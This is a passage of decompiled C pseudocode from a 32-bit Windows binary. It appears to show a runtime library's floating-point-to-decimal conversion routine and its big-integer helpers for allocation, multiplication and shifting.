  if ( v116 > 0 )
  {
    v124 = 0;
    v114 = v116;
  }
  if ( v126 >= 0 )
  {
    v124 += v126;
    v110 = v126;
LABEL_26:
    v111 = 0;
    goto LABEL_39;
  }
  v110 = 0;
  v114 -= v126;
  v111 = -v126;
LABEL_39:
  if ( (unsigned int)a5 > 9 )
  {
    v138 = 0;
    goto LABEL_71;
  }
  if ( a5 > 5 )
  {
    v104 = false;
    v138 = a5 - 4;
    if ( a5 != 8 )
    {
      if ( a5 != 9 )
      {
        v107 = 0;
        if ( a5 == 6 )
          goto LABEL_139;
        v138 = 3;
LABEL_45:
        v109 = v126 + a6;
        v127 = v126 + a6 + 1;
        v145[0] = v127;
        if ( v127 <= 0 )
        {
          v145[0] = 1;
          v135 = sub_407800(1);
        }
        else
        {
          v135 = sub_407800(v127);
        }
        goto LABEL_47;
      }
LABEL_201:
      v138 = 5;
      v107 = 1;
      goto LABEL_45;
    }
LABEL_138:
    v107 = 1;
    goto LABEL_139;
  }
  v104 = (unsigned int)(v18 + v116 + 1021) <= 0x7F7;
  if ( a5 == 4 )
    goto LABEL_138;
  if ( a5 == 5 )
    goto LABEL_201;
  v107 = 0;
  if ( a5 != 2 )
  {
    if ( a5 == 3 )
      goto LABEL_45;
LABEL_71:
    v145[0] = (int)((double)v129 * 0.30103) + 3;
    v135 = sub_407800(v145[0]);
    if ( v116 < 0 || v126 > a1[5] )
    {
      v47 = a1[1];
      v48 = v129 - v18 + 1;
      v145[0] = v48;
      if ( v47 <= v116 - (v129 - v18) )
      {
        v124 += v48;
        v112 = 0;
        v130 = v111;
        v133 = 0;
        v117 = v114;
        v114 += v48;
        v109 = -1;
        v127 = -1;
        goto LABEL_98;
      }
      v112 = 0;
      v133 = 0;
      v109 = -1;
      v127 = -1;
      goto LABEL_95;
    }
    v127 = -1;
    goto LABEL_74;
  }
LABEL_139:
  v62 = 1;
  if ( a6 > 0 )
    v62 = a6;
  v145[0] = v62;
  v109 = v62;
  v135 = sub_407800(v62);
  v127 = v109;
  v133 = v109;
LABEL_47:
  v27 = a1[3] - 1;
  v112 = v27;
  if ( a1[3] != 1 )
  {
    if ( v27 < 0 )
      v27 = 2;
    v112 = v27;
    if ( (v8 & 8) == 0 )
    {
LABEL_124:
      if ( v116 >= 0 && a1[5] >= v126 )
        goto LABEL_126;
      if ( v107 != 0 )
        goto LABEL_191;
LABEL_132:
      if ( v114 != 0 && v124 != 0 )
      {
        v60 = v124;
        if ( v114 <= v124 )
          v60 = v114;
        v61 = v114 - v60;
        v145[0] = v60;
        v124 -= v60;
        v114 -= v60;
        if ( v111 == 0 )
        {
          v117 = v61;
          v120 = nullptr;
          goto LABEL_105;
        }
      }
      else if ( v111 == 0 )
      {
        v120 = nullptr;
        v117 = v114;
        goto LABEL_105;
      }
      v86 = sub_409A70(v12, v111);
      v120 = nullptr;
      v111 = 0;
      v12 = v86;
      v117 = v114;
      goto LABEL_105;
    }
    v112 = 3 - v27;
  }
  if ( (unsigned int)v127 > 0xE || !v104 || (v126 | v112) != 0 )
    goto LABEL_124;
  v145[0] = 0;
  v113 = v119;
  if ( v108 == 0 || v119 >= 1.0 )
  {
    v28 = v119 + v119 + 7.0;
    LODWORD(v105) = LODWORD(v28);
    HIDWORD(v105) = HIDWORD(v28) - 54525952;
    if ( v127 != 0 )
    {
      v29 = v127;
      v106 = 0;
      v103 = v119;
      goto LABEL_59;
    }
    goto LABEL_121;
  }
  if ( v127 == 0 )
  {
    v57 = v119 + v119 + 7.0;
    LODWORD(v105) = LODWORD(v57);
    HIDWORD(v105) = HIDWORD(v57) - 54525952;
LABEL_121:
    v58 = v119 - 5.0;
    if ( v58 > v105 )
    {
      *(_BYTE *)v135 = 49;
      sub_4096A0(0);
      v125 = 2;
      v31 = (_DWORD *)((char *)v135 + 1);
      v128 = 32;
      goto LABEL_77;
    }
    if ( -v105 > v58 )
    {
LABEL_202:
      v83 = ~v133;
      sub_4096A0(0);
LABEL_203:
      v128 = 16;
      v125 = v83 + 1;
      v31 = v135;
      goto LABEL_81;
    }
    goto LABEL_123;
  }
  v29 = v109;
  if ( v109 <= 0 )
  {
LABEL_123:
    v59 = LODWORD(v113);
    v112 = 0;
    v119 = COERCE_DOUBLE(__PAIR64__(HIDWORD(v113), v59));
    goto LABEL_124;
  }
  v106 = -1;
  v119 = v119 * 10.0;
  v103 = v119;
  v96 = v119 * 3.0 + 7.0;
  LODWORD(v105) = LODWORD(v96);
  HIDWORD(v105) = HIDWORD(v96) - 54525952;
LABEL_59:
  v30 = dbl_7AD5F8[v29];
  if ( v107 == 0 )
  {
    v91 = v105 * v30;
    v145[0] = 1;
    v92 = v119;
    v31 = v135;
    while ( 1 )
    {
      v93 = (int)v92;
      if ( (int)v92 != 0 )
        v92 = v92 - (double)(int)v92;
      v31 = (_DWORD *)((char *)v31 + 1);
      v38 = v93 + 48;
      *((_BYTE *)v31 - 1) = v38;
      if ( v145[0] == v29 )
        break;
      v92 = v92 * 10.0;
      ++v145[0];
    }
    v94 = v92;
    if ( v92 > v91 + 0.5 )
    {
      v39 = v135;
      goto LABEL_68;
    }
    v95 = 0.5 - v91;
    v33 = v94;
    if ( v95 > v94 )
    {
LABEL_259:
      v125 = v106 + 1;
      v128 = 16 * (0.0 != v33);
      goto LABEL_77;
    }
    v119 = v113;
    if ( v116 < 0 || a1[5] < 0 )
    {
      v112 = 0;
      goto LABEL_132;
    }
LABEL_74:
    v112 = 0;
    v41 = dbl_7AD600[v126];
    goto LABEL_75;
  }
  v31 = (_DWORD *)((char *)v135 + 1);
  v32 = 0.5 / v30 - v105;
  v33 = v103 - (double)(int)v103;
  *(_BYTE *)v135 = (int)v103 + 48;
  if ( v32 > v33 )
    goto LABEL_259;
  while ( 1 )
  {
    v37 = v32;
    if ( v32 > 1.0 - v33 )
    {
      v38 = *((_BYTE *)v31 - 1);
      v39 = v135;
      goto LABEL_68;
    }
    if ( ++v145[0] >= v29 )
      break;
    v31 = (_DWORD *)((char *)v31 + 1);
    v34 = v33 * 10.0;
    v35 = (int)v34;
    v36 = v34 - (double)(int)v34;
    v32 = v37 * 10.0;
    v33 = v36;
    *((_BYTE *)v31 - 1) = v35 + 48;
    if ( v32 > v36 )
      goto LABEL_259;
  }
  v119 = v113;
  if ( v116 >= 0 )
  {
    v112 = 0;
    if ( a1[5] < 0 )
      goto LABEL_191;
LABEL_126:
    v41 = dbl_7AD600[v126];
    if ( v133 < 0 && v127 <= 0 )
    {
      if ( v127 == 0 && v41 * 5.0 < v119 )
      {
        *(_BYTE *)v135 = 49;
        sub_4096A0(0);
        v128 = 32;
        v125 = v126 + 2;
        v31 = (_DWORD *)((char *)v135 + 1);
        goto LABEL_77;
      }
      goto LABEL_202;
    }
LABEL_75:
    v145[0] = 1;
    v31 = (_DWORD *)((char *)v135 + 1);
    v139 = (int)(v119 / v41);
    *(_BYTE *)v135 = v139 + 48;
    v125 = v126 + 1;
    v42 = v119 - (double)v139 * v41;
    v43 = v42 == 0.0;
    for ( j = v42; ; j = v46 )
    {
      if ( v43 )
        goto LABEL_77;
      if ( v145[0] == v127 )
        break;
      v45 = j * 10.0;
      v31 = (_DWORD *)((char *)v31 + 1);
      ++v145[0];
      v139 = (int)(v45 / v41);
      *((_BYTE *)v31 - 1) = v139 + 48;
      v46 = v45 - (double)v139 * v41;
      v43 = v46 == 0.0;
    }
    if ( v112 != 0 )
    {
      v128 = 16;
      if ( v112 != 1 )
        goto LABEL_77;
    }
    else
    {
      v101 = j + j;
      if ( v101 <= v41 )
      {
        v128 = 16;
        if ( v101 != v41 || (v139 & 1) == 0 )
          goto LABEL_77;
      }
    }
    v38 = *((_BYTE *)v31 - 1);
    v106 = v126;
    v39 = v135;
    while ( 1 )
    {
LABEL_68:
      v40 = (char *)v31 - 1;
      if ( v38 != 57 )
        goto LABEL_69;
      if ( v40 == v39 )
        break;
      v38 = *((_BYTE *)v31 - 2);
      v31 = (_DWORD *)((char *)v31 - 1);
    }
    ++v106;
    *(_BYTE *)v135 = 48;
    v38 = *((_BYTE *)v31 - 1);
LABEL_69:
    v128 = 32;
    *v40 = v38 + 1;
    v125 = v106 + 1;
    goto LABEL_77;
  }
  v112 = 0;
LABEL_191:
  v47 = a1[1];
  if ( v47 <= v116 - (v129 - v18) || ((v138 - 3) & 0xFFFFFFFD) == 0 )
  {
    v80 = v127 - 1;
    if ( v111 >= v127 - 1 )
    {
      v130 = v111 - v80;
      if ( v127 >= 0 )
      {
        v124 += v127;
        v145[0] = v127;
        v117 = v114;
        v114 += v127;
      }
      else
      {
        v145[0] = 0;
        v117 = v114 - v127;
      }
      goto LABEL_98;
    }
    goto LABEL_211;
  }
LABEL_95:
  v49 = v116 - v47 + 1;
  v145[0] = v49;
  if ( v127 <= 0 || v138 <= 1 || v127 >= v49 )
  {
    v124 += v49;
    v130 = v111;
    v117 = v114;
    v114 += v49;
    goto LABEL_98;
  }
  v80 = v127 - 1;
  if ( v111 < v127 - 1 )
  {
LABEL_211:
    v110 += v80 - v111;
    v124 += v127;
    v145[0] = v127;
    v120 = (_DWORD *)sub_409810(1);
    if ( v114 == 0 )
    {
      v117 = 0;
      v114 = v127;
      v82 = sub_409A70(v12, v80);
      goto LABEL_200;
    }
    v111 = v80;
    v98 = v114;
    if ( v124 <= v114 )
      v98 = v124;
    v124 -= v98;
    v145[0] = v98;
    v117 = v114 - v98;
    v114 = v114 + v127 - v98;
LABEL_199:
    v82 = sub_409A70(v12, v111);
LABEL_200:
    v111 = 1;
    v12 = v82;
    goto LABEL_105;
  }
  v124 += v127;
  v145[0] = v127;
  v130 = v111 - v80;
  v117 = v114;
  v114 += v127;
LABEL_98:
  v120 = (_DWORD *)sub_409810(1);
  if ( v117 != 0 && v124 > 0 )
  {
    v50 = v124;
    if ( v117 <= v124 )
      v50 = v117;
    v114 -= v50;
    v145[0] = v50;
    v117 -= v50;
    v124 -= v50;
  }
  if ( v111 != 0 )
  {
    if ( v130 == 0 )
      goto LABEL_199;
    v120 = (_DWORD *)sub_409A70(v120, v130);
    v81 = sub_4098C0(v120, v12);
    v102 = (void *)v12;
    v12 = v81;
    sub_4096A0(v102);
    v111 -= v130;
    if ( v111 != 0 )
      goto LABEL_199;
  }
  v111 = 1;
LABEL_105:
  v51 = sub_409810(1);
  v131 = v51;
  v52 = v138 <= 1 && v18 == 1;
  if ( v110 != 0 )
  {
    v131 = sub_409A70(v51, v110);
    if ( v52 && a2 > a1[1] + 1 )
    {
      ++v114;
      ++v124;
      v110 = 1;
    }
    else
    {
      v110 = 0;
    }
    _BitScanReverse(&v79, *(_DWORD *)(v131 + 4 * *(_DWORD *)(v131 + 16) + 16));
    v53 = v79 ^ 0x1F;
  }
  else
  {
    if ( v52 && a2 > a1[1] + 1 )
    {
      ++v114;
      ++v124;
      v110 = 1;
    }
    v53 = 31;
  }
  v54 = (v53 - (_BYTE)v124 - 4) & 0x1F;
  v145[0] = v54;
  v55 = v54;
  if ( v54 + v114 > 0 )
  {
    v12 = sub_409C00(v12, v54 + v114);
    v55 = v145[0];
  }
  v56 = v124 + v55;
  if ( v56 > 0 )
    v131 = sub_409C00(v131, v56);
  if ( v108 != 0 && (int)sub_409D70(v12, v131) < 0 )
  {
    v12 = sub_409710(v12, 10, 0);
    v74 = v109 <= 0 && v138 > 2;
    if ( v111 == 0 )
    {
      if ( !v74 )
      {
        v125 = v126--;
        v127 = v109;
LABEL_177:
        v75 = v135;
        for ( k = 1; ; k = v145[0] + 1 )
        {
          v145[0] = k;
          ++v75;
          v77 = sub_407900(v12, v131) + 48;
          *(v75 - 1) = v77;
          if ( v145[0] >= v127 )
            break;
          v12 = sub_409710(v12, 10, 0);
        }
        LOBYTE(v134) = v77;
        v72 = nullptr;
LABEL_181:
        if ( v112 != 0 )
        {
          if ( v112 != 2 )
          {
            if ( *(int *)(v12 + 16) <= 1 )
            {
              v78 = *(_DWORD *)(v12 + 20);
              if ( v78 == 0 )
                goto LABEL_185;
            }
LABEL_205:
            v84 = v135;
            goto LABEL_207;
          }
        }
        else
        {
          v143 = v72;
          v12 = sub_409C00(v12, 1);
          v87 = sub_409D70(v12, v131);
          v72 = v143;
          if ( v87 > 0 || v87 == 0 && (v134 & 1) != 0 )
            goto LABEL_205;
        }
        v128 = 16;
        v73 = v75;
        if ( *(int *)(v12 + 16) > 1 )
          goto LABEL_166;
        v78 = *(_DWORD *)(v12 + 20);
LABEL_185:
        v128 = 16 * (v78 != 0);
        v73 = v75;
        goto LABEL_166;
      }
      goto LABEL_269;
    }
    v120 = (_DWORD *)sub_409710(v120, 10, 0);
    if ( v74 )
    {
LABEL_269:
      --v126;
      v127 = v109;
LABEL_115:
      if ( v127 == 0 )
      {
        v131 = sub_409710(v131, 5, 0);
        if ( (int)sub_409D70(v12, v131) > 0 )
        {
          *(_BYTE *)v135 = 49;
          sub_4096A0(v131);
          v31 = (_DWORD *)((char *)v135 + 1);
          if ( v120 != nullptr )
          {
            v128 = 32;
            v125 = v126 + 2;
            goto LABEL_119;
          }
          v128 = 32;
          v125 = v126 + 2;
          goto LABEL_77;
        }
      }
      sub_4096A0(v131);
      if ( v120 != nullptr )
      {
        v125 = -v133;
        sub_4096A0(v120);
        v128 = 16;
        v31 = v135;
        goto LABEL_81;
      }
      v83 = ~v133;
      goto LABEL_203;
    }
    v125 = v126--;
    v127 = v109;
  }
  else
  {
    if ( v127 <= 0 && v138 > 2 )
      goto LABEL_115;
    v125 = v126 + 1;
    if ( v111 == 0 )
      goto LABEL_177;
  }
  v63 = v117 + v54;
  if ( v63 > 0 )
    v120 = (_DWORD *)sub_409C00(v120, v63);
  v64 = v120;
  if ( v110 != 0 )
  {
    v97 = sub_4095C0(v120[1]);
    memcpy((void *)(v97 + 12), v120 + 3, 4 * v120[4] + 8);
    v64 = (_DWORD *)sub_409C00(v97, 1);
  }
  v136 = v64;
  v65 = v120;
  v132 = v135;
  for ( m = 1; ; m = v145[0] + 1 )
  {
    v145[0] = m;
    v68 = sub_407900(v12, v131);
    v134 = v68 + 48;
    v118 = v68;
    v69 = sub_409D70(v12, v65);
    v70 = sub_409DC0(v131, v136);
    if ( *(_DWORD *)(v70 + 12) != 0 )
    {
      sub_4096A0(v70);
      v67 = 1;
    }
    else
    {
      v115 = v70;
      v121 = sub_409D70(v12, v70);
      sub_4096A0(v115);
      v67 = v121 | v138;
      if ( (v121 | v138) != 0 )
      {
        v67 = v121;
      }
      else if ( (v112 | *a3 & 1) == 0 )
      {
        v122 = v65;
        v71 = v136;
        if ( v134 != 57 )
        {
          if ( v69 <= 0 )
          {
            v128 = 16;
            if ( *(int *)(v12 + 16) <= 1 )
              v128 = 16 * (*(_DWORD *)(v12 + 20) != 0);
          }
          else
          {
            v128 = 32;
            LOBYTE(v134) = v118 + 49;
          }
          *v132 = v134;
          v72 = v122;
          v73 = v132 + 1;
          v120 = v136;
          goto LABEL_166;
        }
        v99 = v132 + 1;
LABEL_283:
        v72 = v122;
        v120 = v71;
        goto LABEL_284;
      }
    }
    if ( v69 < 0 || (v138 | v69) == 0 && (*(_BYTE *)a3 & 1) == 0 )
      break;
    if ( v67 > 0 && v112 != 2 )
    {
      v122 = v65;
      v99 = v132 + 1;
      v71 = v136;
      if ( v134 != 57 )
      {
        v128 = 32;
        v72 = v122;
        v120 = v136;
        *v132 = v134 + 1;
        v73 = v132 + 1;
        goto LABEL_166;
      }
      goto LABEL_283;
    }
    *v132 = v134;
    if ( v145[0] == v127 )
    {
      v72 = v65;
      v75 = v132 + 1;
      v120 = v136;
      goto LABEL_181;
    }
    v12 = sub_409710(v12, 10, 0);
    if ( v65 == v136 )
    {
      v136 = (_DWORD *)sub_409710(v65, 10, 0);
      v65 = v136;
    }
    else
    {
      v65 = (_DWORD *)sub_409710(v65, 10, 0);
      v136 = (_DWORD *)sub_409710(v136, 10, 0);
    }
    ++v132;
  }
  v123 = v65;
  v88 = v136;
  if ( v112 == 0 )
  {
    if ( v67 > 0 )
      goto LABEL_262;
LABEL_265:
    if ( *(int *)(v12 + 16) <= 1 )
    {
      v72 = v123;
      v120 = v136;
      if ( *(_DWORD *)(v12 + 20) != 0 )
        v128 = 16;
      else
        v128 = v112;
LABEL_231:
      v73 = v132 + 1;
      *v132 = v134;
      goto LABEL_166;
    }
LABEL_266:
    v72 = v123;
    v128 = 16;
    v120 = v136;
    goto LABEL_231;
  }
  if ( *(int *)(v12 + 16) > 1 || *(_DWORD *)(v12 + 20) != 0 )
  {
    v89 = v123;
    if ( v112 != 2 )
    {
      while ( (int)sub_409D70(v131, v88) > 0 )
      {
        *v132++ = v134;
        v90 = (_DWORD *)sub_409710(v88, 10, 0);
        if ( v89 == v88 )
          v89 = v90;
        v144 = v90;
        v12 = sub_409710(v12, 10, 0);
        v88 = v144;
        v134 = sub_407900(v12, v131) + 48;
      }
      v123 = v89;
      if ( v134 != 57 )
      {
        v120 = v88;
        v72 = v89;
        LOBYTE(v134) = v134 + 1;
        v128 = 32;
        goto LABEL_231;
      }
      goto LABEL_288;
    }
    goto LABEL_266;
  }
  if ( v67 <= 0 )
  {
    v72 = v123;
    v120 = v136;
    goto LABEL_231;
  }
LABEL_262:
  v12 = sub_409C00(v12, 1);
  v100 = sub_409D70(v12, v131);
  if ( v100 <= 0 && (v100 != 0 || (v134 & 1) == 0) )
  {
    v112 = 32;
    goto LABEL_265;
  }
  if ( v134 != 57 )
  {
    v112 = 32;
    LOBYTE(v134) = v118 + 49;
    goto LABEL_265;
  }
LABEL_288:
  v72 = v123;
  v120 = v88;
  v99 = v132 + 1;
LABEL_284:
  v84 = v135;
  v75 = v99;
  *v132 = 57;
  do
  {
LABEL_207:
    v73 = v75--;
    v85 = *(v73 - 1);
    if ( v85 != 57 )
    {
      v128 = 32;
      *v75 = v85 + 1;
      goto LABEL_166;
    }
  }
  while ( v75 != v84 );
  v128 = 32;
  *(_BYTE *)v135 = 49;
  v125 = v126 + 2;
LABEL_166:
  v142 = v73;
  v137 = v72;
  sub_4096A0(v131);
  v31 = v142;
  if ( v120 != nullptr )
  {
    if ( v137 != nullptr && v137 != v120 )
    {
      sub_4096A0(v137);
      v31 = v142;
    }
LABEL_119:
    v141 = v31;
    sub_4096A0(v120);
    v31 = v141;
  }
LABEL_77:
  if ( v135 < v31 )
  {
    do
    {
      if ( *((_BYTE *)v31 - 1) != 48 )
        break;
      v31 = (_DWORD *)((char *)v31 - 1);
    }
    while ( v31 != v135 );
  }
LABEL_81:
  v140 = v31;
  sub_4096A0(v12);
  *v140 = 0;
  *a7 = v125;
  if ( a8 != nullptr )
    *a8 = v140;
  *a4 |= v128;
  return v135;
}


// ----- sub_409340 @ 0x409340 -----
int __cdecl sub_409340(int a1, int a2)
{
  int result; // eax
  _DWORD *v3; // esi
  unsigned int v4; // ebx
  char v5; // di
  int *v6; // edx
  int v7; // eax
  int v8; // ebx
  int v9; // esi
  _DWORD *v10; // edx
  _DWORD *v11; // edi
  _DWORD *v12; // [esp+0h] [ebp-20h]
  int v13; // [esp+4h] [ebp-1Ch]
  int v14; // [esp+8h] [ebp-18h]

  v13 = a2 >> 5;
  v14 = *(_DWORD *)(a1 + 16);
  if ( v14 <= a2 >> 5 )
    goto LABEL_2;
  v12 = (_DWORD *)(a1 + 20);
  v3 = (_DWORD *)(a1 + 20 + 4 * v13);
  v4 = a1 + 20 + 4 * v14;
  v5 = a2 & 0x1F;
  if ( (a2 & 0x1F) == 0 )
  {
    v11 = (_DWORD *)(a1 + 20);
    if ( (unsigned int)v3 < v4 )
    {
      do
        *v11++ = *v3++;
      while ( (unsigned int)v3 < v4 );
      v10 = &v12[v14 - v13];
      goto LABEL_13;
    }
LABEL_2:
    *(_DWORD *)(a1 + 16) = 0;
LABEL_3:
    *(_DWORD *)(a1 + 20) = 0;
    return a1;
  }
  v6 = v3 + 1;
  v7 = *v3 >> (a2 & 0x1F);
  if ( (unsigned int)(v3 + 1) >= v4 )
  {
    *(_DWORD *)(a1 + 20) = v7;
    if ( v7 != 0 )
    {
      v10 = (_DWORD *)(a1 + 20);
LABEL_9:
      ++v10;
      goto LABEL_13;
    }
    goto LABEL_2;
  }
  v8 = a1 + 20;
  do
  {
    v9 = *v6;
    v8 += 4;
    ++v6;
    *(_DWORD *)(v8 - 4) = (v9 << (32 - v5)) | v7;
    v7 = (unsigned int)*(v6 - 1) >> v5;
  }
  while ( (unsigned int)v6 < a1 + 20 + 4 * v14 );
  v10 = &v12[v14 - v13 - 1];
  *v10 = v7;
  if ( v7 != 0 )
    goto LABEL_9;
LABEL_13:
  result = v10 - v12;
  *(_DWORD *)(a1 + 16) = result;
  if ( v10 == v12 )
    goto LABEL_3;
  return result;
}


// ----- sub_409460 @ 0x409460 -----
int __cdecl sub_409460(int a1)
{
  unsigned int v2; // ecx
  int v3; // edx

  _EAX = (_DWORD *)(a1 + 20);
  v2 = a1 + 20 + 4 * *(_DWORD *)(a1 + 16);
  v3 = 0;
  if ( a1 + 20 < v2 )
  {
    while ( *_EAX == 0 )
    {
      ++_EAX;
      v3 += 32;
      if ( (unsigned int)_EAX >= v2 )
        return v3;
    }
    if ( (unsigned int)_EAX < v2 )
    {
      __asm { tzcnt   eax, [eax] }
      v3 += _EAX;
    }
  }
  return v3;
}


// ----- sub_4094C0 @ 0x4094c0 -----
void __usercall sub_4094C0(int a1@<eax>)
{
  __int32 v2; // eax

  switch ( dword_7B2A08 )
  {
    case 2:
LABEL_11:
      EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)((char *)&stru_7B2A20 + (-a1 & 0x18)));
      return;
    case 0:
      v2 = _InterlockedExchange(&dword_7B2A08, 1);
      if ( v2 != 0 )
      {
        if ( v2 != 2 )
          goto LABEL_5;
      }
      else
      {
        InitializeCriticalSection(&stru_7B2A20);
        InitializeCriticalSection(&stru_7B2A38);
        j_atexit(sub_409580);
      }
      dword_7B2A08 = 2;
      goto LABEL_11;
    case 1:
      do
      {
        Sleep(1u);
LABEL_5:
        ;
      }
      while ( dword_7B2A08 == 1 );
      if ( dword_7B2A08 == 2 )
        goto LABEL_11;
      break;
    default:
      break;
  }
}


// ----- sub_409580 @ 0x409580 -----
void __cdecl sub_409580()
{
  if ( _InterlockedExchange(&dword_7B2A08, 3) == 2 )
  {
    DeleteCriticalSection(&stru_7B2A20);
    DeleteCriticalSection(&stru_7B2A38);
  }
}


// ----- sub_4095C0 @ 0x4095c0 -----
int *__cdecl sub_4095C0(int a1)
{
  int *result; // eax
  int v2; // ecx
  unsigned int v3; // edx
  int *v4; // [esp+1Ch] [ebp-Ch]

  sub_4094C0(0);
  if ( a1 > 9 )
    goto LABEL_5;
  result = (int *)dword_7B29E0[a1];
  if ( result == nullptr )
  {
    result = (int *)off_7AC0B0;
    v3 = (unsigned int)((4 << a1) + 27) >> 3;
    if ( v3 + ((off_7AC0B0 - &unk_7B20E0) >> 3) <= 0x120 )
    {
      off_7AC0B0 = (_UNKNOWN *)((char *)off_7AC0B0 + 8 * v3);
      v2 = 1 << a1;
      goto LABEL_7;
    }
LABEL_5:
    result = (int *)malloc(((4 << a1) + 27) & 0xFFFFFFF8);
    if ( result == nullptr )
      return result;
    v2 = 1 << a1;
LABEL_7:
    result[1] = a1;
    result[2] = v2;
    if ( dword_7B2A08 != 2 )
      goto LABEL_8;
    goto LABEL_4;
  }
  dword_7B29E0[a1] = *result;
  if ( dword_7B2A08 == 2 )
  {
LABEL_4:
    v4 = result;
    LeaveCriticalSection(&stru_7B2A20);
    result = v4;
  }
LABEL_8:
  result[4] = 0;
  result[3] = 0;
  return result;
}


// ----- sub_4096A0 @ 0x4096a0 -----
void __cdecl sub_4096A0(int *a1)
{
  int v1; // eax
  int v2; // ecx

  if ( a1 != nullptr )
  {
    if ( a1[1] <= 9 )
    {
      sub_4094C0(0);
      v1 = a1[1];
      v2 = dword_7B29E0[v1];
      dword_7B29E0[v1] = (int)a1;
      *a1 = v2;
      if ( dword_7B2A08 == 2 )
        LeaveCriticalSection(&stru_7B2A20);
    }
    else
    {
      free(a1);
    }
  }
}


// ----- sub_409710 @ 0x409710 -----
int *__cdecl sub_409710(int *a1, int a2, int a3)
{
  int v3; // ecx
  __int64 v4; // rax
  int *v5; // ebx
  __int64 v7; // [esp+10h] [ebp-38h]
  int v8; // [esp+1Ch] [ebp-2Ch]
  __int64 v9; // [esp+28h] [ebp-20h]

  v3 = 0;
  v9 = a3;
  v8 = a1[4];
  LODWORD(v7) = a2;
  do
  {
    HIDWORD(v7) = a2 >> 31;
    v4 = v9 + v7 * (unsigned int)a1[v3 + 5];
    a1[v3++ + 5] = v4;
    v9 = HIDWORD(v4);
  }
  while ( v8 > v3 );
  v5 = a1;
  if ( HIDWORD(v4) != 0 )
  {
    if ( a1[2] <= v8 )
    {
      v5 = sub_4095C0(a1[1] + 1);
      if ( v5 != nullptr )
      {
        memcpy(v5 + 3, a1 + 3, 4 * a1[4] + 8);
        sub_4096A0(a1);
        v5[v8 + 5] = v9;
        v5[4] = v8 + 1;
      }
    }
    else
    {
      v5 = a1;
      a1[v8 + 5] = HIDWORD(v4);
      a1[4] = v8 + 1;
    }
  }
  return v5;
}


// ----- sub_409810 @ 0x409810 -----
_DWORD *__cdecl sub_409810(int a1)
{
  _DWORD *result; // eax
  _DWORD *v2; // [esp+1Ch] [ebp-Ch]

  sub_4094C0(0);
  result = (_DWORD *)dword_7B29E4;
  if ( dword_7B29E4 != 0 )
  {
    dword_7B29E4 = *(_DWORD *)dword_7B29E4;
    if ( dword_7B2A08 != 2 )
    {
LABEL_3:
      result[3] = 0;
      result[4] = 1;
      result[5] = a1;
      return result;
    }
LABEL_8:
    v2 = result;
    LeaveCriticalSection(&stru_7B2A20);
    result = v2;
    goto LABEL_3;
  }
  result = off_7AC0B0;
  if ( (unsigned int)(((off_7AC0B0 - &unk_7B20E0) >> 3) + 4) <= 0x120 )
  {
    off_7AC0B0 = (_UNKNOWN *)((char *)off_7AC0B0 + 32);
LABEL_7:
    result[1] = 1;
    result[2] = 2;
    if ( dword_7B2A08 != 2 )
      goto LABEL_3;
    goto LABEL_8;
  }
  result = malloc(0x20u);
  if ( result != nullptr )
    goto LABEL_7;
  return result;
}


// ----- sub_4098C0 @ 0x4098c0 -----
int *__cdecl sub_4098C0(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v3; // ebx
  int *v4; // eax
  unsigned int v5; // esi
  unsigned int v6; // edx
  _DWORD *v7; // eax
  unsigned int *v8; // edx
  unsigned int *v9; // ecx
  unsigned int *v10; // ebx
  unsigned int v11; // esi
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  unsigned int v14; // eax
  int v16; // [esp+14h] [ebp-44h]
  _DWORD *v17; // [esp+18h] [ebp-40h]
  int *v18; // [esp+28h] [ebp-30h]
  unsigned int *v19; // [esp+2Ch] [ebp-2Ch]
  unsigned int v20; // [esp+30h] [ebp-28h]
  unsigned int v21; // [esp+34h] [ebp-24h]
  int v22; // [esp+38h] [ebp-20h]
  unsigned int v23; // [esp+38h] [ebp-20h]
  int v24; // [esp+3Ch] [ebp-1Ch]
  unsigned int v25; // [esp+3Ch] [ebp-1Ch]

  v2 = a2;
  v24 = a1[4];
  v22 = a2[4];
  if ( v24 >= v22 )
  {
    v24 = a2[4];
    v2 = a1;
    v22 = a1[4];
    a1 = a2;
  }
  v3 = v22 + v24;
  v4 = sub_4095C0(v2[1] + (v2[2] < v22 + v24));
  v18 = v4;
  if ( v4 != nullptr )
  {
    v5 = (unsigned int)(v4 + 5);
    v6 = (unsigned int)&v4[v3 + 5];
    if ( (unsigned int)(v4 + 5) < v6 )
    {
      v7 = v4 + 6;
      *(_DWORD *)v5 = 0;
      if ( (unsigned int)v7 < v6 )
      {
        if ( ((v6 + ~v5) & 4) == 0 || (*v7 = 0, v7 = v18 + 7, (unsigned int)(v18 + 7) < v6) )
        {
          do
          {
            *v7 = 0;
            v7 += 2;
            *(v7 - 1) = 0;
          }
          while ( (unsigned int)v7 < v6 );
        }
      }
    }
    v20 = (unsigned int)&a1[v24 + 5];
    if ( (unsigned int)(a1 + 5) < v20 )
    {
      v17 = (_DWORD *)v5;
      v16 = v22 + v24;
      v21 = (unsigned int)&v2[v22 + 5];
      v8 = (unsigned int *)v5;
      v25 = (unsigned int)(a1 + 5);
      do
      {
        while ( 1 )
        {
          v25 += 4;
          v23 = *(_DWORD *)(v25 - 4);
          if ( v23 != 0 )
            break;
          ++v8;
          if ( v25 >= v20 )
            goto LABEL_18;
        }
        v19 = v8;
        v9 = v2 + 5;
        v10 = v8;
        v11 = 0;
        do
        {
          v12 = v23 * (unsigned __int64)*v9++;
          v13 = v11 + *v10++ + v12;
          *(v10 - 1) = v13;
          v11 = HIDWORD(v13);
        }
        while ( (unsigned int)v9 < v21 );
        v14 = (-21 - (_DWORD)v2 + v21) & 0xFFFFFFFC;
        if ( v21 < (unsigned int)v2 + 21 )
          v14 = 0;
        v8 = v19 + 1;
        *(unsigned int *)((char *)v19 + v14 + 4) = v11;
      }
      while ( v25 < v20 );
LABEL_18:
      v5 = (unsigned int)v17;
      v3 = v16;
    }
    if ( v3 > 0 )
    {
      do
      {
        if ( *(_DWORD *)(v5 + 4 * v3 - 4) != 0 )
          break;
        --v3;
      }
      while ( v3 != 0 );
    }
    v18[4] = v3;
  }
  return v18;
}


// ----- sub_409A70 @ 0x409a70 -----
int *__cdecl sub_409A70(int *a1, int a2)
{
  int *v2; // esi
  int v3; // ebx
  int *result; // eax
  int **v5; // edi
  int *v6; // eax
  int *v7; // eax
  int *v8; // eax
  int *v9; // [esp+1Ch] [ebp-1Ch]
  int *v10; // [esp+1Ch] [ebp-1Ch]

  v2 = a1;
  if ( (a2 & 3) != 0 )
  {
